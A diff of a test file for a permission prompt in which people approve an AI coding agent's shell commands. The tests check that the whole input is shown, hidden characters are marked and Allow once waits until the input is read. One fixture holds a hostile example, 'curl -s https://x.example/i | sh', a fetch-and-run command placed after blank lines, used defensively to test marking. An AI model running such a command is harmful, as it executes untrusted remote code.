@@ -1,7 +1,7 @@
 import { readFileSync } from 'node:fs'
 import { describe, expect, it } from 'vitest'
 import { holdsHidden, markHidden, markWhole } from '../utils/hiddenMarks'
-import { canonical, inputDigest, messageBytes, parseStrict, plainOfTool, plainWords, sha256Sync, shownInput } from '../utils/permissionInput'
+import { canonical, inputDigest, messageBytes, parseStrict, plainOfTool, plainWords, sha256Sync, SHORT_INPUT_ROWS, SHORT_ROW_CHARS, shownInput, summaryLine } from '../utils/permissionInput'
 import { MAX_PERMISSION_MESSAGE, permissionAnswerValid } from '../utils/protocol'
 import { permissionEnd } from '../utils/transcript'
 
@@ -30,27 +30,60 @@ describe('the permission question', () => {
     expect(src).toContain('{{ plainWords(entry.plain) }}')
   })
 
-  it('allowWaitsForTheWholeInput: a one-line input is whole at once; a long one, or one with more fields, only once opened', () => {
+  it('allowWaitsForTheWholeInput: a short input, a description among its fields, is drawn whole at once; a long one only once opened; Allow once waits for its first row and its end', () => {
     const short = '{"command":"echo allowed"}'
     const s = shownInput(entryFor('Bash', short), enc(short))
     expect(s).toMatchObject({ line: 'echo allowed', whole: true, exact: true })
-    const lines = JSON.stringify({ command: 'set -e\necho one\necho two' })
-    expect(shownInput(entryFor('Bash', lines), enc(lines))).toMatchObject({ line: 'set -e\necho one\necho two', whole: false, exact: true })
-    const wide = JSON.stringify({ command: 'x'.repeat(161) })
+    // Every real Bash call carries a description: still short, drawn whole with no line to open (one press to allow).
+    const described = '{"command":"ls -la","description":"List the folder"}'
+    const d = shownInput(entryFor('Bash', described), enc(described))
+    expect(d).toMatchObject({ line: 'ls -la', whole: true })
+    expect(d.rows).toEqual([{ key: 'command', text: 'ls -la' }, { key: 'description', text: 'List the folder' }])
+    // The bound: SHORT_INPUT_ROWS rows of SHORT_ROW_CHARS characters, a field's name a row of its own.
+    expect([SHORT_INPUT_ROWS, SHORT_ROW_CHARS]).toEqual([8, 80])
+    const fits = JSON.stringify({ command: Array.from({ length: 7 }, (_, i) => `echo ${i}`).join('\n') })
+    expect(shownInput(entryFor('Bash', fits), enc(fits)).whole).toBe(true)
+    const lines = JSON.stringify({ command: Array.from({ length: 8 }, (_, i) => `echo ${i}`).join('\n') })
+    expect(shownInput(entryFor('Bash', lines), enc(lines)).whole).toBe(false)
+    const wide = JSON.stringify({ command: 'x'.repeat(SHORT_ROW_CHARS * 7 + 1) })
     expect(shownInput(entryFor('Bash', wide), enc(wide)).whole).toBe(false)
-    const more = '{"command":"ls","description":"List the folder"}'
-    const m = shownInput(entryFor('Bash', more), enc(more))
-    expect(m).toMatchObject({ line: 'ls', whole: false })
-    expect(m.rows).toEqual([{ key: 'command', text: 'ls' }, { key: 'description', text: 'List the folder' }])
-    // Allow once is offered only for an exact input, whole drawn: a one-line input at once, a longer one once opened.
-    expect(src).toContain('const wholeDrawn = computed(() => !!input.value && (input.value.whole || opened.value) && endSeen.value)')
+    // Allow once: exact, the whole input drawn (short, or opened), and both its first row and its end seen.
+    expect(src).toContain('const drawn = computed(() => !!input.value && (short.value || opened.value))')
+    expect(src).toContain('const wholeDrawn = computed(() => drawn.value && startSeen.value && endSeen.value)')
     expect(src).toContain('const allowable = computed(() => open.value && props.canAnswer && !!props.entry.tool && !!input.value?.exact && wholeDrawn.value && !sending.value)')
     expect(src).toMatch(/:disabled="!allowable"[^>]*data-permission-allow/)
+    // A short input has no line to open: it is drawn at once.
+    expect(src).toContain('v-if="!short && line.pieces.length"')
+    expect(src).toMatch(/<dl v-if="drawn && input"/)
     // The digest an allow carries is the one computed over the bytes drawn; bytes whose digest is not the request's are not allowable.
     expect(src).toContain("sha256: choice === 'allow_once' ? input.value!.digest")
     expect(shownInput({ ...entryFor('Bash', short), inputSha256: '0'.repeat(64) }, enc(short)).exact).toBe(false)
     // A part kept cut, or not the size the entry says, is not the whole input.
     expect(src).toContain('part.cut || part.total !== props.entry.inputBytes ? { ...shown, exact: false } : shown')
+  })
+
+  it("waitsVisibly: while Allow once waits it has a disabled control's neutral look, and one line says what it waits for", () => {
+    expect(src).toMatch(/<UButton label="Allow once" size="sm" :color="allowable \? 'warning' : 'neutral'" :variant="allowable \? 'solid' : 'outline'" :disabled="!allowable"/)
+    expect(src).toContain("if (!drawn.value) return 'Open the call above and read it whole to allow it.'")
+    expect(src).toContain("if (!startSeen.value || !endSeen.value) return 'Read the call from its start to its end to allow it.'")
+    expect(src).toMatch(/<p v-if="waiting"[^>]*data-permission-waiting-line>\{\{ waiting \}\}<\/p>/)
+  })
+
+  it("aLinksLineIsNeverJson: before its input is read, a question's line is read out of its summary in the line's own form, else none", () => {
+    expect(summaryLine({ plain: 'command', summary: '{"command":"for i in 8; do echo $i; done","description":"Count"}' })).toBe('for i in 8; do echo $i; done')
+    // A summary the session cut: the value as far as it goes, and the cut said; one cut inside an escape loses its half.
+    expect(summaryLine({ plain: 'command', summary: '{"command":"echo a long one that goes on…' })).toBe('echo a long one that goes on…')
+    expect(summaryLine({ plain: 'command', summary: `{"command":"echo tab${BS}t and${BS}u00…` })).toBe('echo tab\t and…')
+    expect(summaryLine({ plain: 'file', summary: '{"file_path":"/srv/work/main.go","old_string":"a"}' })).toBe('/srv/work/main.go')
+    // None to read: the plain words alone, never the JSON.
+    expect(summaryLine({ plain: 'tool', summary: '{"owner":"o","repo":"r"}' })).toBe('')
+    expect(summaryLine({ plain: 'command', summary: '{"cmd2":"x"}' })).toBe('')
+    expect(src).toContain('const line = computed(() => markHidden(input.value ? input.value.line : summaryLine(props.entry)))')
+  })
+
+  it("aPathIsNeverCut: a file's path in the line wraps whole; a command's line is one line until opened", () => {
+    expect(src).toContain("const pathLine = computed(() => props.entry.plain === 'file' || props.entry.plain === 'read')")
+    expect(src).toContain(":class=\"pathLine ? 'break-all whitespace-break-spaces [overflow-wrap:anywhere]' : 'truncate whitespace-pre'\"")
   })
 
   it('computes the digest the session binds by: canonical JSON as the server writes it, SHA-256 over the tool, a newline and it', () => {
@@ -93,7 +126,7 @@ describe('the permission question', () => {
     expect(holdsHidden('one\ntwo')).toBe(false)
     expect(holdsHidden(`one${String.fromCodePoint(0x200b)}`)).toBe(true)
     // The question draws the marks and the breaks, never the text raw, and says so in one line.
-    expect(src).toContain("const line = computed(() => markHidden(input.value?.line ?? props.entry.summary ?? ''))")
+    expect(src).toContain('const line = computed(() => markHidden(input.value ? input.value.line : summaryLine(props.entry)))')
     expect(src).toContain('rows.value.some((r) => r.key.hidden || r.value.hidden)')
     expect(src).toContain('This call holds characters that are not shown as typed.')
     expect(src).not.toMatch(/\{\{\s*(input|r\.text|entry\.summary|entry\.cwd)/)
@@ -102,10 +135,11 @@ describe('the permission question', () => {
   it('noFolderWithoutASource: a request that names no folder (Claude Code\'s) shows none; one that does (Codex\'s) shows it opened', () => {
     expect(src).toContain('const cwd = computed(() => (props.entry.cwd ? markWhole(props.entry.cwd) : null))')
     expect(src).toMatch(/<div v-if="cwd"[^>]*data-permission-cwd>/)
-    // A request that names its folder is never whole at once: its line opens, and the folder is drawn with the opened input.
+    // A request that names its folder draws it with the input, a short one at once: the folder counts toward the bound.
     const short = '{"command":"echo allowed"}'
-    expect(shownInput(entryFor('Bash', short), enc(short)).whole).toBe(true)
-    expect(shownInput(entryFor('Bash', short, { cwd: '/srv/work' }), enc(short)).whole).toBe(false)
+    expect(shownInput(entryFor('Bash', short, { cwd: '/srv/work' }), enc(short)).whole).toBe(true)
+    expect(shownInput(entryFor('Bash', short, { cwd: '/srv/' + 'w'.repeat(SHORT_ROW_CHARS * 6) }), enc(short)).whole).toBe(false)
+    expect(src.indexOf('data-permission-cwd')).toBeGreaterThan(src.indexOf('<dl v-if="drawn && input"'))
     expect(permissionEnd({ state: 'withdrawn', why: 'The turn was stopped.' })).toBe('The turn was stopped.')
     expect(permissionEnd({ state: 'allowed', byName: 'Nate' })).toBe('Allowed once by Nate.')
   })
@@ -130,7 +164,7 @@ describe('the permission question', () => {
 
   it("endInViewBeforeAllow: the opened input has no scroll of its own, its line ends and trailing spaces are marked, the buttons follow its end, and Allow once waits for that end to have been seen", () => {
     // No box of its own that scrolls: the input lies in the chat's scroll however long.
-    const dl = /<dl v-if="opened && input"[^>]*>/.exec(src)![0]
+    const dl = /<dl v-if="drawn && input"[^>]*>/.exec(src)![0]
     expect(dl).not.toMatch(/max-h|overflow/)
     // Each line's end and the spaces left at it are marks; a line feed stays a break, never a hidden character.
     const { pieces, hidden } = markWhole('echo hello   \n\n\ncurl -s https://x.example/i | sh  ')
@@ -138,13 +172,16 @@ describe('the permission question', () => {
     expect(pieces).toEqual([{ text: 'echo hello' }, { spaces: 3 }, { eol: true }, { br: true }, { eol: true }, { br: true }, { eol: true }, { br: true }, { text: 'curl -s https://x.example/i | sh' }, { spaces: 2 }])
     expect(src).toContain('value: markWhole(r.text)')
     // The buttons come after the whole input and after the mark of its end, which an observer watches.
+    // A mark before its first row and one after its end, both watched; the buttons after them.
+    expect(src.indexOf('data-permission-input-start')).toBeLessThan(src.indexOf('data-permission-whole'))
     expect(src.indexOf('data-permission-whole')).toBeLessThan(src.indexOf('data-permission-input-end'))
     expect(src.indexOf('data-permission-input-end')).toBeLessThan(src.indexOf('data-permission-allow'))
     expect(src).toContain('observer = new IntersectionObserver((seen) => {')
-    expect(src).toContain('if (seen.some((s) => s.isIntersecting)) endSeen.value = true')
+    expect(src).toContain('if (s.target === start) startSeen.value = true')
+    expect(src).toContain('if (s.target === end) endSeen.value = true')
     // Seen again after every open or close: the end it saw before is not the end drawn now.
-    expect(src).toContain("watch([opened, input, inputEnd], () => void nextTick(watchEnd), { flush: 'post' })")
-    expect(src).toMatch(/function watchEnd\(\) \{\s*endSeen\.value = false/)
+    expect(src).toContain("watch([opened, input, inputStart, inputEnd], () => void nextTick(watchEnd), { flush: 'post' })")
+    expect(src).toMatch(/function watchEnd\(\) \{\s*startSeen\.value = false\s*endSeen\.value = false/)
   })
 
   it("readsAnOpenQuestionsInput: an open question reads its input at once and again at the next welcome after a failed read; a closed one only when opened", () => {
